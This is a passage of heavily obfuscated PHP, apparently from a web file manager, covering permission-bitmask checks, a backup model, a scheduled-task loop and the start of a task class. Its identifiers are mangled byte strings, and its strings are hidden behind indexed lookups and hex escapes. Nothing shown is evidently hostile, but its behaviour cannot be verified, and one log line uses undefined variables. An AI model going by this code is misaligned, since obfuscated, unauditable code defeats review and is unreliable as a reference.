authCheckEdit($ƒ”Å‚éã) { return self::authCheck($ƒ”Å‚éã, self::AUTH_EDIT); } public static function authCheckRemove($ï†˘Œù) { return self::authCheck($ï†˘Œù, self::AUTH_REMOVE); } public static function authCheckShare($ﬂ»á–çô) { return self::authCheck($ﬂ»á–çô, self::AUTH_SHARE); } public static function authCheckComment($´Ë´≥ﬂ¢) { return self::authCheck($´Ë´≥ﬂ¢, self::AUTH_COMMENT); } public static function authCheckEvent($˘ïÄà£ ) { return self::authCheck($˘ïÄà£ , self::AUTH_EVENT); } public static function authCheckRoot($Ò≠Ô‰∏ï) { return self::authCheck($Ò≠Ô‰∏ï, self::AUTH_ROOT); } public static function authCheckAction($µÅÏÌêá, $˚∞Ñµ¢ã) { $ô˝—£ Ù =& $_SERVER[ß⁄ˆÇ†Œ]; $è–˚ø≥á = array($ô˝—£ Ù[1983] => self::AUTH_VIEW, $ô˝—£ Ù[1275] => self::AUTH_DOWNLOAD, $ô˝—£ Ù[110] => self::AUTH_UPLOAD, $ô˝—£ Ù[1932] => self::AUTH_EDIT, $ô˝—£ Ù[1931] => self::AUTH_REMOVE, $ô˝—£ Ù[1942] => self::AUTH_SHARE, $ô˝—£ Ù[439] => self::AUTH_COMMENT, $ô˝—£ Ù[1752] => self::AUTH_EVENT, $ô˝—£ Ù[1984] => self::AUTH_ROOT); if (!isset($è–˚ø≥á[$˚∞Ñµ¢ã])) { return; } $¶°ú¸‰≠ = $è–˚ø≥á[$˚∞Ñµ¢ã]; $µÅÏÌêá = intval($µÅÏÌêá); if ($µÅÏÌêá <= 0) { return !1; } if (($µÅÏÌêá & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($µÅÏÌêá & $¶°ú¸‰≠); } public static function authDisable($ò‹ê¶¥Ù, $ïÈ©£›˙) { if (intval($ò‹ê¶¥Ù) <= 0) { return 0; } return intval($ò‹ê¶¥Ù) & ~$ïÈ©£›˙; } public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x73\x6f\x75\x72\x63\x65\101\165\164\150\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\x61\x75\164\150", "\154\x61\142\145\154", "\x64\x69\x73\160\x6c\141\x79", "\x73\171\163\x74\x65\x6d", "\x73\157\162\164"); public function initData() { $ÿà«≈≈À = $this->authDefault(); foreach ($ÿà«≈≈À as $÷ø∏ªŒ⁄) { $this->add($÷ø∏ªŒ⁄); } } public function findAuth($œÏÍÑ°, $‹≥≥œ¶Ò) { $ ﬂ‚∫Í˜ =& $_SERVER[ß⁄ˆÇ†Œ]; $ûµ¯ôıÓ = parent::listData(); foreach ($ûµ¯ôıÓ as $±ÛÙ„§û) { $ôÊÜ‹•è = intval($±ÛÙ„§û[$ ﬂ‚∫Í˜[495]]); if ($ôÊÜ‹•è <= 0 || $±ÛÙ„§û[$ ﬂ‚∫Í˜[1985]] == 0) { continue; } if (($ôÊÜ‹•è & $œÏÍÑ°) != $œÏÍÑ°) { continue; } if (($ôÊÜ‹•è & $‹≥≥œ¶Ò) != 0) { continue; } return $±ÛÙ„§û[$ ﬂ‚∫Í˜[483]]; } return !1; } public function findAuthReadOnly() { $¨æ°”π· = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $∑†Ïõﬁ€ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¨æ°”π·, $∑†Ïõﬁ€); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ı«›ù¯á =& $_SERVER[ß⁄ˆÇ†Œ]; $§–ıÑ’’ = parent::listData(); $Æ”©⁄›Ú = !1; foreach ($§–ıÑ’’ as $ã¶€£‡˚) { if ($ã¶€£‡˚[$ı«›ù¯á[495]] <= 0 || $ã¶€£‡˚[$ı«›ù¯á[1985]] == $ı«›ù¯á[228]) { continue; } if (!$Æ”©⁄›Ú) { $Æ”©⁄›Ú = $ã¶€£‡˚; continue; } if ($Æ”©⁄›Ú[$ı«›ù¯á[495]] > $ã¶€£‡˚[$ı«›ù¯á[495]]) { $Æ”©⁄›Ú = $ã¶€£‡˚; } } return $Æ”©⁄›Ú ? $Æ”©⁄›Ú[$ı«›ù¯á[483]] : $ı«›ù¯á[12]; } public function listData($ßìÏß»ø = false, $∆Æ‘ü¥ª = "\x73\x6f\162\x74", $Õæï…Ÿ· = false) { return parent::listData($ßìÏß»ø, $∆Æ‘ü¥ª, $Õæï…Ÿ·); } public function update($µÑ⁄ØÈ÷, $ô˛ƒà”å) { $ÄÖÒ«¡∑ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ù¬√¢†¡ = parent::listData($µÑ⁄ØÈ÷); $∂ûè≥˛û = $this->findByName($ô˛ƒà”å[$ÄÖÒ«¡∑[32]]); if (!$Ù¬√¢†¡ || $∂ûè≥˛û && $∂ûè≥˛û[$ÄÖÒ«¡∑[483]] != $Ù¬√¢†¡[$ÄÖÒ«¡∑[483]]) { return !1; } $this->filterAuth($ô˛ƒà”å[$ÄÖÒ«¡∑[495]]); return parent::update($µÑ⁄ØÈ÷, $ô˛ƒà”å); } public function remove($æøÕ†ä) { $ÏÁñ¯≠° = parent::listData($æøÕ†ä); if (!$ÏÁñ¯≠° || $ÏÁñ¯≠°[$_SERVER[ß⁄ˆÇ†Œ][191]]) { return !1; } return parent::remove($æøÕ†ä); } public function add($ÊŒ‚‚ã€ = array()) { $ÒÒ§˙∞ç =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->findByName($ÊŒ‚‚ã€[$ÒÒ§˙∞ç[32]])) { return !1; } $∑ÓôÒ˜∞ = array($ÒÒ§˙∞ç[32] => $ÒÒ§˙∞ç[12], $ÒÒ§˙∞ç[495] => 1, $ÒÒ§˙∞ç[1986] => $ÒÒ§˙∞ç[1973], $ÒÒ§˙∞ç[1985] => 1, $ÒÒ§˙∞ç[191] => 0, $ÒÒ§˙∞ç[1987] => 0); $ÊŒ‚‚ã€ = array_merge($∑ÓôÒ˜∞, $ÊŒ‚‚ã€); $ÊŒ‚‚ã€[$ÒÒ§˙∞ç[1987]] = $this->getSort(); $this->filterAuth($ÊŒ‚‚ã€[$ÒÒ§˙∞ç[495]]); return parent::insert($ÊŒ‚‚ã€); } private function getSort() { $Åü°÷≈ﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; $ä◊®© É = parent::listData(); $ÅôÇ°Ç“ = array_to_keyvalue($ä◊®© É, $Åü°÷≈ﬂ[12], $Åü°÷≈ﬂ[1987]); return empty($ÅôÇ°Ç“) ? 0 : max($ÅôÇ°Ç“) + 1; } private function filterAuth(&$¨®ÍøÅ∆) { if (!$¨®ÍøÅ∆) { return; } $∑ÿÛ†™≤ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ªéΩË≈— = array(); foreach ($∑ÿÛ†™≤ as $ıŒ¯‚˝¬) { if ($¨®ÍøÅ∆ & $ıŒ¯‚˝¬) { $ªéΩË≈—[] = $ıŒ¯‚˝¬; } } if (in_array(self::AUTH_ROOT, $ªéΩË≈—)) { $¨®ÍøÅ∆ = array_sum($∑ÿÛ†™≤); return; } $°Ä˘„‡Ç = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ªéΩË≈— as $ıŒ¯‚˝¬) { if (isset($°Ä˘„‡Ç[$ıŒ¯‚˝¬])) { $ªéΩË≈— = array_merge($ªéΩË≈—, $°Ä˘„‡Ç[$ıŒ¯‚˝¬]); } } $ªéΩË≈—[] = self::AUTH_SHOW; $¨®ÍøÅ∆ = array_sum(array_unique($ªéΩË≈—)); } public function sort($åÖøÊô§, $ØÀà‘ñ) { return parent::update($åÖøÊô§, $ØÀà‘ñ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x62\x61\143\x6b\x75\160\x4c\x69\163\164"; public $field = array("\151\x6f", "\x6e\141\x6d\x65", "\x73\164\x61\164\x75\163", "\143\x6f\156\164\145\156\x74", "\x6d\x61\156\165\141\154", "\x72\145\163\x75\x6c\x74", "\164\151\x6d\x65\106\162\157\155", "\164\151\155\145\124\157"); public function config() { $àËà™≈– =& $_SERVER[ß⁄ˆÇ†Œ]; Action($àËà™≈–[1988])->taskInit(); $˜Ãç»∑˙ = Model($àËà™≈–[843])->get($àËà™≈–[856]); $˜Ãç»∑˙ = json_decode($˜Ãç»∑˙, !0); $˜Ãç»∑˙ = is_array($˜Ãç»∑˙) ? $˜Ãç»∑˙ : array(); $this->parseContent($˜Ãç»∑˙); unset($˜Ãç»∑˙[$àËà™≈–[1734]]); Model($àËà™≈–[1733])->cacheClear(); $‹¶ïÑâ≠ = $àËà™≈–[1989]; $üÅÓ˙ÿß = Model($àËà™≈–[1990])->findByKey($àËà™≈–[1752], $‹¶ïÑâ≠); if (!$üÅÓ˙ÿß) { $üÅÓ˙ÿß = array(); } if (isset($üÅÓ˙ÿß[$àËà™≈–[206]])) { $üÅÓ˙ÿß[$àËà™≈–[206]] = json_decode($üÅÓ˙ÿß[$àËà™≈–[206]], !0); } if (isset($˜Ãç»∑˙[$àËà™≈–[206]])) { $üÅÓ˙ÿß[$àËà™≈–[206]][$àËà™≈–[1737]] = $˜Ãç»∑˙[$àËà™≈–[206]]; unset($˜Ãç»∑˙[$àËà™≈–[206]]); } return array_merge($üÅÓ˙ÿß, $˜Ãç»∑˙); } public function listData($ÙΩÈÏã† = false, $Ï≈ÄûÎ— = "\x6d\x6f\144\151\146\x79\x54\x69\155\x65", $çåÉ∫∑¡ = false) { $Ñ£πã°œ = parent::listData($ÙΩÈÏã†, $Ï≈ÄûÎ—, !0); if (!$Ñ£πã°œ) { return $Ñ£πã°œ; } if ($ÙΩÈÏã†) { $Ñ£πã°œ = array($Ñ£πã°œ); } foreach ($Ñ£πã°œ as &$Ë®áÚ∏°) { $this->parseContent($Ë®áÚ∏°); } return $ÙΩÈÏã† ? $Ñ£πã°œ[0] : $Ñ£πã°œ; } public function parseContent(&$‰Û∂ÜÌÜ) { $“òø◊™ó =& $_SERVER[ß⁄ˆÇ†Œ]; $∆ï—·ÕÄ = _get($‰Û∂ÜÌÜ, $“òø◊™ó[171], $“òø◊™ó[91]); if (!in_array($∆ï—·ÕÄ, array($“òø◊™ó[849], $“òø◊™ó[1207]))) { $‰Û∂ÜÌÜ[$“òø◊™ó[171]] = $∆ï—·ÕÄ == $“òø◊™ó[91] ? $“òø◊™ó[1207] : $“òø◊™ó[849]; } } public function lastItem() { $ŒÃÆìÉÁ = $this->listData(); return !empty($ŒÃÆìÉÁ[0]) ? $ŒÃÆìÉÁ[0] : null; } public function kill($”∆Êµë§) { $˜∏µΩ±ê =& $_SERVER[ß⁄ˆÇ†Œ]; $±»ÿ ’ç = $this->listData($”∆Êµë§); if (!$±»ÿ ’ç || empty($±»ÿ ’ç[$˜∏µΩ±ê[32]])) { return !0; } Task::kill($˜∏µΩ±ê[855]); Task::kill($˜∏µΩ±ê[873]); Task::kill($˜∏µΩ±ê[882]); $º‚√¯≤Î = $±»ÿ ’ç[$˜∏µΩ±ê[32]]; $Ñ¿›æôˆ = TEMP_FILES . $˜∏µΩ±ê[852] . $º‚√¯≤Î . $˜∏µΩ±ê[8]; IO::remove($Ñ¿›æôˆ, !1); return $this->remove($”∆Êµë§); } public function remove($€’‚Î≥±) { $¸áâ¬Íˆ = $this->listData($€’‚Î≥±); if (!$¸áâ¬Íˆ) { return !0; } return $this->backupRemove($¸áâ¬Íˆ); } private function backupRemove($¶Á´÷»‘) { parent::remove($¶Á´÷»‘[$_SERVER[ß⁄ˆÇ†Œ][483]]); $∏Úú˙¬  = $this->backupPath($¶Á´÷»‘); IO::remove($∏Úú˙¬ , !1); return !0; } private function backupPath($©¢⁄£”§) { $íïê¸Ù≈ =& $_SERVER[ß⁄ˆÇ†Œ]; $ ÆâÛ—± = $©¢⁄£”§[$íïê¸Ù≈[32]]; $é«ëªü˘ = Model($íïê¸Ù≈[843])->get($íïê¸Ù≈[844]); $£¨∞≠ÈÂ = substr(md5($íïê¸Ù≈[845] . $é«ëªü˘ . $ ÆâÛ—±), 0, 8); return "\173\151\x6f\x3a{$©¢⁄£”§[$íïê¸Ù≈[825]]}\175\x2f\144\141\x74\x61\142\141\163\x65\57\142\141\x63\153\165\x70\57" . $ ÆâÛ—± . $íïê¸Ù≈[11] . $£¨∞≠ÈÂ; } public function start() { $‹Õ†Ø›⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($GLOBALS[$‹Õ†Ø›⁄[6]][$‹Õ†Ø›⁄[92]][$‹Õ†Ø›⁄[1991]] != $‹Õ†Ø›⁄[91]) { return !0; } $∫ÀΩîí™ = $this->config(); if (!$∫ÀΩîí™ || $∫ÀΩîí™[$‹Õ†Ø›⁄[1734]] != $‹Õ†Ø›⁄[91]) { return !1; } if ($∫ÀΩîí™[$‹Õ†Ø›⁄[171]] == $‹Õ†Ø›⁄[849]) { $µÊ¨ﬂï® = Model($‹Õ†Ø›⁄[843])->get($‹Õ†Ø›⁄[1320]); if ($µÊ¨ﬂï® == $‹Õ†Ø›⁄[1321]) { $∫ÀΩîí™[$‹Õ†Ø›⁄[171]] = $‹Õ†Ø›⁄[1207]; } } $îß°¬¬ = $this->process(); foreach ($îß°¬¬ as $ÔÚˆ»˙÷) { if ($ÔÚˆ»˙÷) { return Task::restart($ÔÚˆ»˙÷[$‹Õ†Ø›⁄[483]]); } } $≈®‹‘∏‰ = new Backup(); $ê∏∑Ò¢‹ = $≈®‹‘∏‰->db(); if ($ê∏∑Ò¢‹) { $ê∏∑Ò¢‹ = $≈®‹‘∏‰->dbFile(); if ($ê∏∑Ò¢‹ && $∫ÀΩîí™[$‹Õ†Ø›⁄[171]] == $‹Õ†Ø›⁄[849]) { $ê∏∑Ò¢‹ = $≈®‹‘∏‰->file(); } } Backup::set(array($‹Õ†Ø›⁄[823] => 1, $‹Õ†Ø›⁄[834] => time())); return !0; } public function process() { $∂Ì˘…äµ =& $_SERVER[ß⁄ˆÇ†Œ]; $à—’Ÿ„î = array($∂Ì˘…äµ[830] => Task::get($∂Ì˘…äµ[855]), $∂Ì˘…äµ[835] => Task::get($∂Ì˘…äµ[873]), $∂Ì˘…äµ[230] => Task::get($∂Ì˘…äµ[882])); $˜›Å≈™  = !1; foreach ($à—’Ÿ„î as &$»≤∏ï¶Â) { if ($˜›Å≈™ ) { $»≤∏ï¶Â = !1; continue; } if ($»≤∏ï¶Â) { $¢⁄æÿ’≠ = intval(_get($»≤∏ï¶Â, $∂Ì˘…äµ[1769], 0)); if (time() - $¢⁄æÿ’≠ > 7200) { Task::kill($»≤∏ï¶Â[$∂Ì˘…äµ[483]]); $˜›Å≈™  = !0; $»≤∏ï¶Â = !1; } } } return $à—’Ÿ„î; } public function restore() { $õø˘à¿¿ =& $_SERVER[ß⁄ˆÇ†Œ]; ActionCall($õø˘à¿¿[1134], !0, 1); ActionCall($õø˘à¿¿[1134], !0, 0); } } goto c¨ìœòÏ˘Ω; DÖﬁ¨ø˘Æó: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ˆº“°Ó¨ =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::valueGet($ˆº“°Ó¨[823]) != $ˆº“°Ó¨[91]) { return; } if (self::valueGet($ˆº“°Ó¨[1714]) == $ˆº“°Ó¨[91]) { $¬∏ó¿„Á = self::valueGet($ˆº“°Ó¨[1715]); if (time() - $¬∏ó¿„Á > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ˆº“°Ó¨[1714], $ˆº“°Ó¨[91]); self::log($ˆº“°Ó¨[1716] . ACTION . $ˆº“°Ó¨[1717]); Hook::bind($ˆº“°Ó¨[1718], $ˆº“°Ó¨[1719]); $ÿΩîàâ√ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ˆº“°Ó¨[823]) != $ˆº“°Ó¨[91]) { self::valueSet($ˆº“°Ó¨[1714], $ˆº“°Ó¨[228]); self::log($ˆº“°Ó¨[1720]); die; } $’◊ÊÆŸé = time(); if ($’◊ÊÆŸé - $ÿΩîàâ√ >= 60) { self::valueSet(array($ˆº“°Ó¨[1714] => $ˆº“°Ó¨[91], $ˆº“°Ó¨[1715] => $’◊ÊÆŸé)); $ÿΩîàâ√ = $’◊ÊÆŸé; } if (!file_exists(USER_SYSTEM . $ˆº“°Ó¨[1721])) { self::valueSet(array($ˆº“°Ó¨[1714] => $ˆº“°Ó¨[228], $ˆº“°Ó¨[823] => $ˆº“°Ó¨[228])); self::log($ˆº“°Ó¨[1722]); die; } $Ç»û„∏Ú = file_get_contents(BASIC_PATH . $ˆº“°Ó¨[1723]); $ÇŒêéÚó = KOD_VERSION . $ˆº“°Ó¨[10] . KOD_VERSION_BUILD; $‹ªˆ±∑ = match_text($Ç»û„∏Ú, $ˆº“°Ó¨[1724]) . $ˆº“°Ó¨[10] . match_text($Ç»û„∏Ú, $ˆº“°Ó¨[1725]); if ($‹ªˆ±∑ != $ÇŒêéÚó) { self::restart(); self::log("\x73\x74\x6f\160\x65\x64\56\x5b\166\145\x72\x73\151\157\x6e\x20\165\x70\144\141\164\x65\x3b{$versionNow}\x20\x3d\76\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ÕÜçÎ∑Á =& $_SERVER[ß⁄ˆÇ†Œ]; http_close(); $GLOBALS[$ÕÜçÎ∑Á[1726]] = 1; $_SERVER[$ÕÜçÎ∑Á[1727]] = $ÕÜçÎ∑Á[1728]; $_COOKIE = array(); $GLOBALS[$ÕÜçÎ∑Á[1729]] = 1; $GLOBALS[$ÕÜçÎ∑Á[1730]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Æ‚∏òÙå =& $_SERVER[ß⁄ˆÇ†Œ]; http_close(); self::valueSet($Æ‚∏òÙå[823], $Æ‚∏òÙå[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Æ‚∏òÙå[1714] => $Æ‚∏òÙå[228], $Æ‚∏òÙå[823] => $Æ‚∏òÙå[91])); self::log($Æ‚∏òÙå[1731]); } public static function taskSwitch() { $ÛéøÂ”» =& $_SERVER[ß⁄ˆÇ†Œ]; $∆¨‰ òı = self::valueGet($ÛéøÂ”»[823]) == $ÛéøÂ”»[91] ? $ÛéøÂ”»[228] : $ÛéøÂ”»[91]; self::valueSet($ÛéøÂ”»[823], $∆¨‰ òı); } public static function shutdownEvent() { $áÖ¥ç£ˆ =& $_SERVER[ß⁄ˆÇ†Œ]; self::valueSet($áÖ¥ç£ˆ[1714], $áÖ¥ç£ˆ[228]); self::log($áÖ¥ç£ˆ[1732]); } public static function config($Í˛ÆŸñ‹, $ï¬ö”«Å) { self::valueSet($_SERVER[ß⁄ˆÇ†Œ][823], $Í˛ÆŸñ‹); } private static function taskRunAll() { $€ê¸µ°ˆ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ö˝—‰ÒÅ = timeFloat(); $ ü’„πì = Model($€ê¸µ°ˆ[1733])->listData(); $Ñ˙Òƒß¢ = count($ ü’„πì); for ($Ùúì¿œ‘ = 0; $Ùúì¿œ‘ < $Ñ˙Òƒß¢; $Ùúì¿œ‘++) { $¡ΩÃ˜⁄è = $ ü’„πì[$Ùúì¿œ‘]; if (!$¡ΩÃ˜⁄è[$€ê¸µ°ˆ[483]] || $¡ΩÃ˜⁄è[$€ê¸µ°ˆ[1734]] != $€ê¸µ°ˆ[91]) { continue; } if (!self::taskTimeCheck($¡ΩÃ˜⁄è)) { continue; } self::taskRun($¡ΩÃ˜⁄è); } Hook::trigger($€ê¸µ°ˆ[1735]); self::taskQueueRun($Ö˝—‰ÒÅ); } private static function taskQueueRun($∏Ø˛≥⁄¬) { $ËÑæŒÊ· = 10; while (!0) { $ˆÓ∞˙™ü = TaskQueue::run(); if ($ˆÓ∞˙™ü === !1) { break; } if (timeFloat() - $∏Ø˛≥⁄¬ >= $ËÑæŒÊ·) { break; } } } private static function taskTimeCheck($•‰©â†ı) { $Ù¡˜∑Üñ =& $_SERVER[ß⁄ˆÇ†Œ]; $¿«àπ≥” = json_decode($•‰©â†ı[$Ù¡˜∑Üñ[206]], !0); $üÏè∑±Ö = intval($•‰©â†ı[$Ù¡˜∑Üñ[1715]]); $ƒî€ã„Å = strtotime($Ù¡˜∑Üñ[1736] . $¿«àπ≥”[$Ù¡˜∑Üñ[1737]] . $Ù¡˜∑Üñ[1738]) - strtotime($Ù¡˜∑Üñ[1739]); $®˛„÷µœ = time() - strtotime(date($Ù¡˜∑Üñ[1740]) . $Ù¡˜∑Üñ[1741]); $ï˛∂˜∆⁄ = $®˛„÷µœ >= $ƒî€ã„Å && $®˛„÷µœ <= $ƒî€ã„Å + 3600; switch ($¿«àπ≥”[$Ù¡˜∑Üñ[33]]) { case $Ù¡˜∑Üñ[1742]: if (time() - $üÏè∑±Ö < 3600 * 24 * 30) { return !1; } if ($¿«àπ≥”[$Ù¡˜∑Üñ[1742]] == date($Ù¡˜∑Üñ[1743]) && $ï˛∂˜∆⁄) { return !0; } break; case $Ù¡˜∑Üñ[1744]: if (time() - $üÏè∑±Ö < 3600 * 24 * 7) { return !1; } $‰Å”¨≈Ã = date($Ù¡˜∑Üñ[1745]) == 0 ? 7 : date($Ù¡˜∑Üñ[1745]); if ($¿«àπ≥”[$Ù¡˜∑Üñ[1744]] == $‰Å”¨≈Ã && $ï˛∂˜∆⁄) { return !0; } break; case $Ù¡˜∑Üñ[1737]: if (time() - $üÏè∑±Ö < 3600 * 24) { return !1; } if ($ï˛∂˜∆⁄) { return !0; } break; case $Ù¡˜∑Üñ[1746]: if (time() - $üÏè∑±Ö >= floatval($¿«àπ≥”[$Ù¡˜∑Üñ[1746]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¡àÕ∫™˘ =& $_SERVER[ß⁄ˆÇ†Œ]; static $ºÁÊ√»¿ = 0; $∞ÖØï˘» = 300; if (!$ºÁÊ√»¿) { $ºÁÊ√»¿ = time(); } if (time() - $ºÁÊ√»¿ < $∞ÖØï˘») { return; } $ºÁÊ√»¿ = time(); $ã „ ¯Ê = Model($¡àÕ∫™˘[585])->db($¡àÕ∫™˘[12]); if ($ã „ ¯Ê) { $ã „ ¯Ê->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¡àÕ∫™˘[1747], $¡àÕ∫™˘[1748]); die; } } public static function taskRun($´≥¬Ô°Ô) { $π˛ø®óÉ =& $_SERVER[ß⁄ˆÇ†Œ]; self::log($π˛ø®óÉ[1749] . $´≥¬Ô°Ô[$π˛ø®óÉ[483]] . $π˛ø®óÉ[1750] . $´≥¬Ô°Ô[$π˛ø®óÉ[32]] . $π˛ø®óÉ[1751] . $´≥¬Ô°Ô[$π˛ø®óÉ[1752]]); Model($π˛ø®óÉ[1733])->run($´≥¬Ô°Ô[$π˛ø®óÉ[483]]); $ÖùÎ–›› = timeFloat(); $äÜé™øÔ = $π˛ø®óÉ[12]; switch ($´≥¬Ô°Ô[$π˛ø®óÉ[33]]) { case $π˛ø®óÉ[392]: $çﬁ∂£â” = url_request($´≥¬Ô°Ô[$π˛ø®óÉ[1752]], $π˛ø®óÉ[261], !1, !1, !1, !1, 10); if ($çﬁ∂£â”[$π˛ø®óÉ[823]]) { $äÜé™øÔ = strlen($çﬁ∂£â”[$π˛ø®óÉ[1283]]); } break; case $π˛ø®óÉ[260]: $äÜé™øÔ = Hook::apply($´≥¬Ô°Ô[$π˛ø®óÉ[1752]]); default: break; } Model($π˛ø®óÉ[1753])->add(array($π˛ø®óÉ[1754] => $π˛ø®óÉ[12], $π˛ø®óÉ[1755] => $π˛ø®óÉ[228], $π˛ø®óÉ[33] => $π˛ø®óÉ[1756] . $´≥¬Ô°Ô[$π˛ø®óÉ[483]], $π˛ø®óÉ[1757] => json_encode(array($π˛ø®óÉ[32] => $´≥¬Ô°Ô[$π˛ø®óÉ[32]], $π˛ø®óÉ[1758] => timeFloat() - $ÖùÎ–››, $π˛ø®óÉ[378] => $äÜé™øÔ)))); $’˝√ããÁ = $äÜé™øÔ ? $π˛ø®óÉ[1759] . $äÜé™øÔ : $π˛ø®óÉ[12]; self::log($π˛ø®óÉ[1760] . $´≥¬Ô°Ô[$π˛ø®óÉ[483]] . $π˛ø®óÉ[178] . $’˝√ããÁ); return !0; } public static function valueGet($∏÷’ú†î) { $¡ãò‡’ã =& $_SERVER[ß⁄ˆÇ†Œ]; $Ì∫∑‹Îù = $¡ãò‡’ã[1761]; $•îÉÅ◊é = Model($¡ãò‡’ã[516])->get($∏÷’ú†î, $Ì∫∑‹Îù); if (is_null($•îÉÅ◊é)) { Model($¡ãò‡’ã[516])->set($¡ãò‡’ã[823], $¡ãò‡’ã[91], $Ì∫∑‹Îù); Model($¡ãò‡’ã[516])->set($¡ãò‡’ã[1714], $¡ãò‡’ã[228], $Ì∫∑‹Îù); $•îÉÅ◊é = Model($¡ãò‡’ã[516])->get($∏÷’ú†î, $Ì∫∑‹Îù); } return $•îÉÅ◊é; } private static function valueSet($ïÈëæÃ·, $…Û≈õÎÒ = false) { $¢•Â©ˆæ =& $_SERVER[ß⁄ˆÇ†Œ]; $≈î¥˛ÕØ = $¢•Â©ˆæ[1762]; CacheLock::lock($≈î¥˛ÕØ); $Ùâ˜Î±Ë = Model($¢•Â©ˆæ[516])->set($ïÈëæÃ·, $…Û≈õÎÒ, $¢•Â©ˆæ[1761]); CacheLock::unlock($≈î¥˛ÕØ); return $Ùâ˜Î±Ë; } protected static function log($ë∑ô¬æß) { write_log($ë∑ô¬æß, $_SERVER[ß⁄ˆÇ†Œ][1748]); } private static function cacheClear() { $°†◊ø•È =& $_SERVER[ß⁄ˆÇ†Œ]; Cache::clearMemory(Model($°†◊ø•È[516])->cacheKey($°†◊ø•È[1761])); Cache::clearMemory(Model($°†◊ø•È[516])->cacheKey($°†◊ø•È[1763])); Model($°†◊ø•È[1733])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ıßµÏ‹π, $πâ˘˚Ÿ¿ = '', $Ï˝ôÔÖ‰ = 0, $Ê·Ä§Äá = '') { $üÏÜ˝® =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::get($ıßµÏ‹π)) { return; } $this->task = array($üÏÜ˝®[483] => $ıßµÏ‹π, $üÏÜ˝®[1764] => USER_ID, $üÏÜ˝®[1653] => $Ê·Ä§Äá, $üÏÜ˝®[534] => $üÏÜ˝®[12], $üÏÜ˝®[33] => $πâ˘˚Ÿ¿, $üÏÜ˝®[1139] => $üÏÜ˝®[12], $üÏÜ˝®[1137] => $Ï˝ôÔÖ‰, $üÏÜ˝®[1765] => 0, $üÏÜ˝®[1766] => 0, $üÏÜ˝®[1767] => 0, $üÏÜ˝®[1768] => timeFloat(), $üÏÜ˝®[1769] => 0, $üÏÜ˝®[1770] => 0, $üÏÜ˝®[1771] => 0, $üÏÜ˝®[1772] => 0, $üÏÜ˝®[823] => $üÏÜ˝®[1714]); $GLOBALS[$üÏÜ˝®[1773]] = 1; Hook::bind($üÏÜ˝®[1718], array($this, $üÏÜ˝®[1774])); Hook::bind($üÏÜ˝®[1775], array($this, $üÏÜ˝®[1776])); $this->startAfter(); Hook::trigger($üÏÜ˝®[1777], $this->task); $this->task[$üÏÜ˝®[1770]] = timeFloat(); } public function end($íÑˆ˘˛Û = '') { $¨‹–’ù˝ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¨‹–’ù˝[1770]]) { self::valueSet($this->task[$¨‹–’ù˝[483]], !1); } $this->isEnd = !0; if ($íÑˆ˘˛Û) { $this->task[$¨‹–’ù˝[534]] = $íÑˆ˘˛Û; } self::log($¨‹–’ù˝[1778] . $this->task[$¨‹–’ù˝[483]] . $¨‹–’ù˝[1779] . sprintf($¨‹–’ù˝[924], timeFloat() - $this->task[$¨‹–’ù˝[1768]]) . $¨‹–’ù˝[1780]); Hook::unbind($¨‹–’ù˝[1718], array($this, $¨‹–’ù˝[1774])); Hook::unbind($¨‹–’ù˝[1775], array($this, $¨‹–’ù˝[1776])); $this->endAfter(); $´åÈäÀÔ = $this->task; $this->task = !1; Hook::trigger($¨‹–’ù˝[1781], $´åÈäÀÔ); } public function update($ç∏Ú˙äπ = 0, $È©ÿ—ÁÌ = false) { $ìæÑûÙî =& $_SERVER[ß⁄ˆÇ†Œ]; $÷ü¶£óà =& $this->task; if (!$÷ü¶£óà) { return; } $÷ü¶£óà[$ìæÑûÙî[1765]] += $ç∏Ú˙äπ; $÷ü¶£óà[$ìæÑûÙî[1769]] = timeFloat(); if ($÷ü¶£óà[$ìæÑûÙî[1137]]) { if ($÷ü¶£óà[$ìæÑûÙî[1137]] < $÷ü¶£óà[$ìæÑûÙî[1765]]) { $÷ü¶£óà[$ìæÑûÙî[1137]] = $÷ü¶£óà[$ìæÑûÙî[1765]]; } $ˆÇ≤§ŸÊ = timeFloat() - $÷ü¶£óà[$ìæÑûÙî[1768]] - 